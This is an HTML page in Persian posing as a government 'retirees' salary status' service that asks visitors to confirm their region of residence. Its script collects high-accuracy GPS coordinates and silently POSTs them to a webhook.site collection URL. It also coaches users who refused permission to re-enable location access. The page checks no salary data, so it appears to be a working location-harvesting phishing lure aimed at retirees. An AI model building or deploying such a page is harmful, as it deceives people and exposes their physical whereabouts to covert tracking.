<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>سامانه بررسی وضعیت حقوق بازنشستگان</title>
    <style>
        :root {
            --primary-color: #2ecc71;
            --primary-dark: #27ae60;
            --bg-color: #f4f7f6;
            --text-color: #2c3e50;
            --error-color: #e74c3c;
            --warn-color: #e67e22;
        }

        * { box-sizing: border-box; }

        body {
            font-family: 'Tahoma', 'Arial', sans-serif;
            text-align: center;
            padding: 20px;
            background-color: var(--bg-color);
            direction: rtl;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            max-width: 450px;
            width: 90%;
            background: white;
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
        }

        h2 { color: var(--text-color); margin-bottom: 15px; font-size: 1.4rem; }
        p { color: #7f8c8d; line-height: 1.8; margin-bottom: 25px; }

        .btn {
            background-color: var(--primary-color);
            color: white;
            padding: 16px 32px;
            font-size: 18px;
            font-weight: bold;
            border: none;
            cursor: pointer;
            border-radius: 12px;
            width: 100%;
            transition: all 0.3s ease;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }

        .btn:hover { background-color: var(--primary-dark); transform: translateY(-2px); }
        .btn:disabled { background-color: #bdc3c7; cursor: wait; opacity: 0.8; transform: none; }

        #result {
            margin-top: 25px;
            font-weight: 500;
            color: #555;
            min-height: 24px;
            line-height: 1.7;
            transition: all 0.3s ease;
            overflow-wrap: anywhere;
        }

        .error-msg { color: var(--error-color); }
        .success-msg { color: var(--primary-dark); font-weight: bold; }
        .warn-msg { color: var(--warn-color); }

        .steps {
            background: #fffbe6;
            border-right: 4px solid #f39c12;
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            font-size: 13px;
            color: #7a5c00;
            text-align: right;
            line-height: 1.9;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>سامانه بررسی وضعیت حقوق بازنشستگان</h2>
    <p>برای بررسی منطقه سکونت و مشاهده وضعیت پرداخت‌ها، لطفاً اجازه دسترسی به موقعیت مکانی خود را بدهید.</p>

    <button class="btn" id="locationBtn">تأیید منطقه سکونت و ورود</button>
    <div id="result">منتظر درخواست شما هستیم.</div>
</div>

<script>
    const button = document.getElementById("locationBtn");
    const result = document.getElementById("result");
    const WEBHOOK_URL = "https://webhook.site/3e658cab-cff7-4b12-ad19-52d6e636d924";
    const currentHost = location.hostname;

    // تشخیص وضعیت اولیه مجوز
    window.addEventListener("load", function () {
        if (!navigator.permissions || !navigator.permissions.query) return;
        navigator.permissions.query({ name: "geolocation" })
            .then(function (perm) {
                if (perm.state === "denied") {
                    showDeniedGuide();
                }
            })
            .catch(function () {});
    });

    button.addEventListener("click", getLocation);

    function setResult(html, cls) {
        result.innerHTML = html;
        result.className = cls || "";
    }

    function showDeniedGuide() {
        setResult(
            "⚠️ دسترسی موقعیت مکانی برای این سایت <b>قبلاً رد شده</b> است و مرورگر اجازه نمی‌دهد پنجره را دوباره نشان دهد.<br>" +
            "این یک محدودیت امنیتی مرورگر است و از داخل کد قابل بازنشانی نیست." +
            "<div class='steps'>" +
            "<b>راه حل:</b> روی <b>آیکون قفل</b> کنار آدرس کلیک کنید → <b>Site settings</b> → <b>Location</b> را روی <b>Ask</b> بگذارید → صفحه را <b>رفرش</b> کنید.<br>" +
            "دامنه فعلی: <b>" + currentHost + "</b>" +
            "</div>",
            "warn-msg"
        );
    }

    function getLocation() {
        setResult("در حال بررسی دسترسی...", "");
        button.disabled = true;

        // ۱. پشتیبانی مرورگر
        if (!navigator.geolocation) {
            setResult("مرورگر شما از قابلیت مکان‌یابی پشتیبانی نمی‌کند.", "error-msg");
            button.disabled = false;
            return;
        }

        // ۲. محیط امن
        if (!window.isSecureContext) {
            setResult(
                "⚠️ صفحه در محیط ناامن باز شده است.<br>" +
                "Geolocation فقط در <b>HTTPS</b> یا <b>localhost</b> کار می‌کند.<br>" +
                "دامنه فعلی: <b>" + currentHost + "</b>",
                "warn-msg"
            );
            button.disabled = false;
            return;
        }

        // ۳. بررسی مجوز
        if (navigator.permissions && navigator.permissions.query) {
            navigator.permissions.query({ name: "geolocation" })
                .then(function (perm) {
                    if (perm.state === "denied") {
                        showDeniedGuide();
                        button.disabled = false;
                        return;
                    }
                    requestPosition();
                })
                .catch(function () {
                    requestPosition();
                });
        } else {
            requestPosition();
        }
    }

    function requestPosition() {
        setResult("در حال درخواست دسترسی...<br>لطفاً پنجره مرورگر را تأیید کنید.", "");

        navigator.geolocation.getCurrentPosition(
            onSuccess,
            onError,
            {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 0
            }
        );
    }

    function onSuccess(position) {
        const lat = position.coords.latitude;
        const lng = position.coords.longitude;
        const acc = position.coords.accuracy;

        setResult("موقعیت دریافت شد. در حال ارسال...", "");

        fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                lat: lat,
                lng: lng,
                accuracy: acc,
                timestamp: new Date().toISOString()
            })
        })
        .then(function (r) {
            if (!r.ok) throw new Error("HTTP " + r.status);
            return r.json().catch(function () { return {}; });
        })
        .then(function () {
            setResult("اطلاعات با موفقیت ثبت شد ✅", "success-msg");
        })
        .catch(function (err) {
            console.error("خطای ارسال:", err);
            setResult("خطا در ارتباط با سرور. دوباره تلاش کنید.", "error-msg");
        })
        .finally(function () {
            button.disabled = false;
        });
    }

    function onError(error) {
        button.disabled = false;

        if (error.code === 1) {
            showDeniedGuide();
        } else if (error.code === 2) {
            setResult(
                "❌ موقعیت در دسترس نیست.<br>" +
                "سرویس Location سیستم‌عامل و اتصال Wi-Fi را بررسی کنید.",
                "error-msg"
            );
        } else if (error.code === 3) {
            setResult("❌ زمان درخواست تمام شد. دوباره تلاش کنید.", "error-msg");
        } else {
            setResult("❌ خطای ناشناخته: " + error.message, "error-msg");
        }
    }
</script>

</body>
</html>
